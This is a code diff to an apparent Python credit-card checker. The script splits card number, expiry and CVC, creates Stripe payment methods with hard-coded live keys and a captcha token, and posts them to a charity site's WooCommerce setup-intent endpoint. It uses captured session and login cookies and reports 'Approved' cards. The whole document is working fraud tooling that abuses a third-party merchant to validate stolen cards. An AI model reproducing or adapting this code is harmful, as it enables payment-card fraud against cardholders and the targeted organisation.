@@ -13,42 +13,84 @@ def scc(ccx):
 	cvc = ccx.split("|")[3]
 	if "20" in yy:#Mo3gza
 		yy = yy.split("20")[1]
+	import requests
 	headers = {
-	    'authority': 'api.sayweee.net',
-	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-	    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+	    'authority': 'api.stripe.com',
+	    'accept': 'application/json',
+	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
+	    'content-type': 'application/x-www-form-urlencoded',
+	    'origin': 'https://js.stripe.com',
+	    'referer': 'https://js.stripe.com/',
+	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
 	    'sec-ch-ua-mobile': '?1',
 	    'sec-ch-ua-platform': '"Android"',
-	    'sec-fetch-dest': 'document',
-	    'sec-fetch-mode': 'navigate',
-	    'sec-fetch-site': 'none',
-	    'upgrade-insecure-requests': '1',
-	    'user-agent': 'Mozilla/5.0 (Linux; Android 12; RMX2163) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-site',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
 	}
 	
-	response = requests.get('https://api.sayweee.net/ec/payment/card/profile/secret', headers=headers).json()
-	token= response['object']['client_secret']
-	tok=token.split('_secret_')[0]
-	u='https://api.stripe.com/v1/setup_intents/'+tok+'/confirm'
-	h={'Host':'api.stripe.com',
-	'content-length':'715',
-	'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
-	'accept':'application/json',
-	'content-type':'application/x-www-form-urlencoded',
-	'sec-ch-ua-mobile':'?1',
-	'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36',
-	'sec-ch-ua-platform':'"Android"',
-	'origin':'https://js.stripe.com',
-	'sec-fetch-site':'same-site',
-	'sec-fetch-mode':'cors',
-	'sec-fetch-dest':'empty',
-	'referer':'https://js.stripe.com/',
-	'accept-encoding':'gzip, deflate, br',
-	'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',}
-	d=f'payment_method_data[type]=card&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_month]={mm}&payment_method_data[card][exp_year]={yy}&payment_method_data[guid]=NA&payment_method_data[muid]=0e100e73-e324-4446-aa4b-ece060aebe1e0d0d05&payment_method_data[sid]=8576b27e-37ed-432c-9358-05b757d968d722e0df&payment_method_data[payment_user_agent]=stripe.js%2F63fd7ebb3%3B+stripe-js-v3%2F63fd7ebb3&payment_method_data[time_on_page]=62840&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_H7mnvGVpW4LhI4ODGWPT1m44&client_secret='+token
-	response1=requests.post(u,headers=h,data=d)
-	if 'Donation Confirmation' in text or "This page doesn't seem to exist" in text:
+	data = f'type=card&billing_details[name]=mska+wj&billing_details[email]=visaspam77%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=4b356589-cfc9-4ce3-bacd-87a9aabfab2d607329&muid=7cc87d82-fed5-482b-9b2f-e66d2e9b50e29d8d03&sid=7393ded3-06d2-4443-acf4-239cfabbe3c8ea8e71&payment_user_agent=stripe.js%2F1a2719a8b8%3B+stripe-js-v3%2F1a2719a8b8%3B+card-element&referrer=https%3A%2F%2Fladymcadden.org&time_on_page=123420&key=pk_live_51IdYQ0LfHgkJerZf3qLsCoyaWQ4rQttxhjKCSgwBT2v5I8v9ro1YqMeypLPf6GgmCArfNox09l16a2HMKVNxk02z00QG312A1Y&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQYmBKRxySZrZh6v6MFmCsemikGlGpWEhh6O7lW9rjjLCFdmFqgTW4oAXM4RbEc73BmG_B2SDxLbjCur-Hgeg1C7mtpk5l0ivb0tw3F9DBvnX7VHuyRSlCyl_e_M6FR6imEND3WSxAwqzMnKaMggFRqgBbDJUD2UVhw4frRr_47X1om4_nKzXRM0m7VObUQg0TEcduvbwNvpqUzwxn7bYhecGGyriCW3TmEuEMUqM47r-9LbfVJ-qZfxsDi2uqZjzfTFxzx9JGo9bKgrjoK0EjVGkyJfzZ0GiKa4IjO200u7rN7GnduXwC0csWPGVBp6b-0J4UerDL6uP-r-XMAt8xHypxghQ1ngdI1xbyT4vvcrUlNImHosvzGDQzJLo1L_-GfoScK8I7qBM4N2mx3Xix1Vvevr3XRN_PW33oxryL623exr0vViV6fWHSg9hDrzrftWrbb-ZAVr831GeidH5o_KWwq2xFJ5z-tLhVGR32I2DvfnzC3DtIAgpGO769GbR8M22uPchYI2KLsy4XOHoM-a3XUVglKvjuJCAb5r9mIGGyQLYSvJ9OHrAlrdUrsXQohNzsMfWIugdgB9eNe4t_cNNeEhBHxq1AP4bSS3cFJHrkIF6Ev3NedB0zEm5WBVZpHb365k6Cy5OmZ2ArDRu14tm5OCnt-Akm7qe3Xb_B25oeY4kEif_pDL-_3LVvw1zp9rc54e7PZpwk1qfNlfWDHwYLLYXtKlhYJF7HKxzq0I48Nte8qoOX_E6WtS7cQzQckmE_yrUKLNaW9whDv0vjDBjcK0_nsVYfeUaWKJEEgdcrS6KAqnfd8J0c9M-iI-1CirR00sDeHvOqgpYZ7uO7WEs_3N9PQRzFOFOY_I-wPPrhpqGGAwqUZXjuy767WFeO1dgPY2sVXamkCkqrAAN-nUTWsmtBnuzy73lJlDET1YXW61YTjbAK4VKpAEJlzHWIIMtnaXSXafBc59vhhwuYJtl7T3FjB0WE8HaKUJ5oegkyw97KBL4kIiyVjTjAYJbb0076TChT_2sc01YDSl1Y56CYGxeDS2Xs1ezu1s-QxhPKm7haUVl-Da_mNi_8pqNcC-TUejDQU0SPJNeEfKwQQG5X05zU6GMJDwrS7SNtj6LO-d0iGBm4lAjl0etaEYmdcY0AeK_HJJGmOjfD8AVUu2WTfr50V6Jqvu7ZehGaolB0wdwUUmTatVNG_g4AP-Xu8xC_RYK3Ub_sXBJdCMkendTBq6Tu27xD0Y1HHAppRUuFgkHiLn190XdQq_IcDpCmg8-lX9JX-tKMFx-LZlkZov1gdI3hEG9pMhma3o_wF0cV_PqR5zRzewAxYdEmTyGEx5HXlL6Bd8psANmzEtk6XuRtEn5d7Vkc7NllNZAckh3mvpD55fPlSszu6iIUw_RkddqddA0ABRObdeIn8sTEvmna9gI8GjR03ipSxcCQzxNG2ssV6rip5leQrWTDlMwstzhU5BE33hdA9MGUeAufik3rPzpX1vWpJ6fQUFxsYJAE0YrO-J2LKAGqAXTWxY8DyqA4nMiX5c2t3X1b0svAvVek9Cv6DnDsvphLj83se30YAEWGdWGyQ5ivuwmDSsAOgM5-1nqPySgNBY_gEC96DpN0wIhGhP49tOr-sPg744P4ZeandUcdP-vUjgbB0Vejw9CzAfkSu4abaUA2oNaGcbPIvrJTeM2skXwDm251hfktqq99KCFMAdED-tMH3a6p-i9QsDGkWQvYCfsEdFS_jaKr1xvQxkBm9t1145nXXevC03yx2Hj4uJZXxUKjuBcKBSsNB2dmAteKb18JyZfUq6931Wqbgi4g4J8nmpGdb7RLD1S5zrEhcA_aou1Xi1WQ__9RRaF2ENvwZxBs4t-2faxrhcP2IvAm7TrOIHdlSMWawMhTvx1jQdmQJTldexgJ0vR2959m1mcKvLme2cNLCK7qL-f2J8oNgzxHd1hBiEjb66DALhArHwCMfdtFdNIvtN1pcnZ_LP7bC9s47eokSc7VYUnOajNmZTUSThEhcPnSmmIh5wRryjsUEtbe4ngjMk_HSmVScSa5ZDy11mBNNYktxxixqAQvzTzvGF0Tg4PuafGYbcUA6jZXhwzmYR2b2oc2hhcmRfaWTOAzGDb6JrcqgyZDBkN2U2Y6JwZAA.SK-SyTzugYiHydaVLkaoG4BbB8zX7TOb3Vq521W-e2I'
+	
+	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
+	id=response.json()['id']
+
+	cookies = {
+	    'cookielawinfo-checkbox-necessary': 'yes',
+	    'cookielawinfo-checkbox-non-necessary': 'yes',
+	    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9',
+	    'viewed_cookie_policy': 'yes',
+	    '__stripe_mid': '7cc87d82-fed5-482b-9b2f-e66d2e9b50e29d8d03',
+	    'sbjs_migrations': '1418474375998%3D1',
+	    'sbjs_current_add': 'fd%3D2024-04-06%2023%3A06%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fladymcadden.org%2Fdonate%2F',
+	    'sbjs_first_add': 'fd%3D2024-04-06%2023%3A06%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fladymcadden.org%2Fdonate%2F',
+	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
+	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
+	    '_gid': 'GA1.2.1560867656.1712444812',
+	    '__stripe_sid': '7393ded3-06d2-4443-acf4-239cfabbe3c8ea8e71',
+	    '_I_': '368676298c93a65e0f5464259e6e30716fe9047b1aa051f5c7d0cae09473b919-1712444853',
+	    'woocommerce_items_in_cart': '1',
+	    'woocommerce_cart_hash': '100a4dc1e71d4ea70d7ffb780c553394',
+	    'et-editor-available-post-147-fb': 'fb',
+	    'wordpress_logged_in_4b482996f3b50f66c45a4b49c7a73faf': 'mska.wj%7C1713655147%7Clm901W7uRhNvSNqG9RIqu0W4peqchMTYd35jLUFmFpJ%7C45b81b0d86c9b3e533c14b3fff2fd61c65e90f410ad635927fa9b3b700555ed0',
+	    'wp_woocommerce_session_4b482996f3b50f66c45a4b49c7a73faf': '65%7C%7C1712479495%7C%7C1712475895%7C%7C0a7c0a9865bae6e016b5c0631cde9d45',
+	    'wfwaf-authcookie-ef87ecef4dde9c78dcc1545fe505646f': '65%7Cother%7Cread%7C80ac34ee242cc6b0813ed728f6a4bba0cdfc59ca94e0d46064664f87a8ecc28d',
+	    'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F',
+	    '_ga_TGRXJZZPXB': 'GS1.1.1712444810.3.1.1712445657.0.0.0',
+	    '_ga_DJ8QP66SFT': 'GS1.1.1712444812.3.1.1712445658.0.0.0',
+	    '_ga': 'GA1.1.953697205.1712306680',
+	}
+	
+	headers = {
+	    'authority': 'ladymcadden.org',
+	    'accept': 'application/json, text/javascript, */*; q=0.01',
+	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
+	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+	    # 'cookie': 'cookielawinfo-checkbox-necessary=yes; cookielawinfo-checkbox-non-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWUsIm5vbi1uZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; __stripe_mid=7cc87d82-fed5-482b-9b2f-e66d2e9b50e29d8d03; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-04-06%2023%3A06%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fladymcadden.org%2Fdonate%2F; sbjs_first_add=fd%3D2024-04-06%2023%3A06%3A50%7C%7C%7Cep%3Dhttps%3A%2F%2Fladymcadden.org%2Fcheckout%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fladymcadden.org%2Fdonate%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; _gid=GA1.2.1560867656.1712444812; __stripe_sid=7393ded3-06d2-4443-acf4-239cfabbe3c8ea8e71; _I_=368676298c93a65e0f5464259e6e30716fe9047b1aa051f5c7d0cae09473b919-1712444853; woocommerce_items_in_cart=1; woocommerce_cart_hash=100a4dc1e71d4ea70d7ffb780c553394; et-editor-available-post-147-fb=fb; wordpress_logged_in_4b482996f3b50f66c45a4b49c7a73faf=mska.wj%7C1713655147%7Clm901W7uRhNvSNqG9RIqu0W4peqchMTYd35jLUFmFpJ%7C45b81b0d86c9b3e533c14b3fff2fd61c65e90f410ad635927fa9b3b700555ed0; wp_woocommerce_session_4b482996f3b50f66c45a4b49c7a73faf=65%7C%7C1712479495%7C%7C1712475895%7C%7C0a7c0a9865bae6e016b5c0631cde9d45; wfwaf-authcookie-ef87ecef4dde9c78dcc1545fe505646f=65%7Cother%7Cread%7C80ac34ee242cc6b0813ed728f6a4bba0cdfc59ca94e0d46064664f87a8ecc28d; sbjs_session=pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fladymcadden.org%2Fmy-account%2Fadd-payment-method%2F; _ga_TGRXJZZPXB=GS1.1.1712444810.3.1.1712445657.0.0.0; _ga_DJ8QP66SFT=GS1.1.1712444812.3.1.1712445658.0.0.0; _ga=GA1.1.953697205.1712306680',
+	    'origin': 'https://ladymcadden.org',
+	    'referer': 'https://ladymcadden.org/my-account/add-payment-method/',
+	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+	    'sec-ch-ua-mobile': '?1',
+	    'sec-ch-ua-platform': '"Android"',
+	    'sec-fetch-dest': 'empty',
+	    'sec-fetch-mode': 'cors',
+	    'sec-fetch-site': 'same-origin',
+	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+	    'x-requested-with': 'XMLHttpRequest',
+	}
+	
+	params = {
+	    'wc-ajax': 'wc_stripe_create_setup_intent',
+	}
+	
+	data = {
+	    'stripe_source_id': id,
+	    'nonce': '63fa188229',
+	}
+	
+	response = requests.post('https://ladymcadden.org/', params=params, cookies=cookies, headers=headers, data=data)
+	if 'success' in response.text:
 		return 'Approved'
 	try:		
 		ct=(response.json()['client_secret'])
@@ -147,7 +189,7 @@ def Tele(ccx):
 		first_line = file.readline()
 	while True:
 		lines='''msmsmsm%7C1716319833%7CtxkSCKepLBqnWVsbbZKyigGkW70Bi6o2QBpcnTjWy2k%7C1cef33755d51a3982e59fb8c43d14c8bb447f4e08bfcd02ec3958ad5a6ae47ac
-  djjdjdjddjjdjdjdjuw62627%7C1716320021%7CffUb4NpK0whkgl8wMLTnanOQiCmjXErXOf1f4uRK5Zw%7Cd48ff2ccb6c3948bf2f0de85b90a3180f37fe500604566017daedfd88e99ba89'''
+djjdjdjddjjdjdjdjuw62627%7C1716320021%7CffUb4NpK0whkgl8wMLTnanOQiCmjXErXOf1f4uRK5Zw%7Cd48ff2ccb6c3948bf2f0de85b90a3180f37fe500604566017daedfd88e99ba89'''
 		lines = lines.strip().split('\n')
 		random_line_number = random.randint(0, len(lines) - 1)
 		big = lines[random_line_number]
